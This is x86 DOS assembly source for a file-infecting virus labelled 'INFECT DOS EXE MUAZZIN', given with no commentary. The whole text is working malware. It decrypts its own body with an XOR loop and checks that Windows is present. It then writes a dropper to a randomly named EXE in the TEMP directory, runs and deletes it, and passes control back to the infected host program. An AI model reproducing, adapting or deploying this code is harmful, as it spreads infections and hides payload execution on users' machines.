;INFECT DOS EXE MUAZZIN
;16b code

.model tiny
.code
.386p
locals

by     equ byte ptr
wo     equ word ptr
dwo    equ dword ptr
ofs    equ offset

org 0

_size  dw 0

real_entry:
       pusha
       mov ax, 1234h                    ;start+4
       mov cx, buffer-crypt_start+1
       xor wo cs:[_size], ax
       mov bx, ofs crypt_start-1
       add cx, wo cs:[_size]
  @@decloop:
       inc ebx
       xor by cs:[bx], ah
       add ah, 12h
       loop @@decloop
       jmp crypt_start

crypt_start:
       push es ds
       mov wo cs:[_return+1], sp
       mov ah, 4ah
       mov bx, -1
       int 21h
       mov ah, 4ah
       sub bx, 1000h
       int 21h
       mov ax, es:[2ch]
       mov bx, es
       mov wo cs:[psp1], bx
       mov wo cs:[psp2], bx
       mov wo cs:[psp3], bx
       add bx, 10h
       add wo cs:[_cs], bx              ;relocate jmp2host
       add wo cs:[_ss], bx              ;relocate stack
       push ax cs
       pop es ds
       mov ax, 160ah
       int 2fh
       test ax, ax
       jnz _return
       cmp bh, 4
       jb _return                      ;no windows running
       sub si, si
  @@retry:
       cmp dwo ds:[si], "PMET"
       je @@found
       cmp dwo ds:[si], "=PMT"          ;search TEMP dir
       je @@found1
       inc si
       cmp si, 512
       jb @@retry
       jmp _return
  @@found:
       inc si
  @@found1:
       lodsd
       sub sp, 100h
       mov di, sp                       ;stack buffer
       mov dx, di
  @@copy:
       lodsb
       test al, al
       je @@zero
       stosb                            ;copy TEMP dir
       jmp @@copy
  @@zero:
       mov al, "\"
       mov cx, 8
       stosb
  @@name:
       in al, 40h
       and al, 01111b
       add al, "A"                      ;append random EXE name
       stosb
       loop @@name
       mov eax, "EXE."
       stosd
       mov ax, 3c00h
       stosb
       push cs dx
       pop si ds
       sub cx, cx
       int 21h
       mov bx, ax
       jc _return
       mov ah, 40h
       mov cx, ds:[_size]
       mov dx, ofs buffer               ;write dropper
       int 21h
       mov ah, 3eh                      ;close file
       int 21h
       mov wo cs:[_name+1], ds
       mov wo cs:[_name2+1], si
       mov dx, si
       call __next
pblock dw 0
       dw 80h
psp1   dw 0
       dw 5ch
psp2   dw 0
       dw 6ch
psp3   dw 0
  __next:
       pop bx
       mov ax, 4b00h
       int 21h
       mov ah, 0
       int 1ah
       mov bx, dx
       add bx, 18+9
  _delay:
       mov ah, 0
       int 1ah
       cmp dx, bx
       jb _delay
  _name:
       mov dx, 1234h
       mov ds, dx
  _name2:
       mov dx, 1234h
       mov ah, 41h
       int 21h
  _return:
       mov sp, 1234h
       pop ds es
       popa
       cli
       db 0bch
__SP = buffer - _sp
_sp    dw 0
       db 0b8h                          ;restore da stack
__SS = buffer - _ss
_ss    dw 0
       mov ss, ax
       sti
       db 0eah                          ;jmp to host
__IP = buffer - _ip
_ip    dw 0
__CS = buffer - _cs
_cs    dw 0

buffer:

end    _size
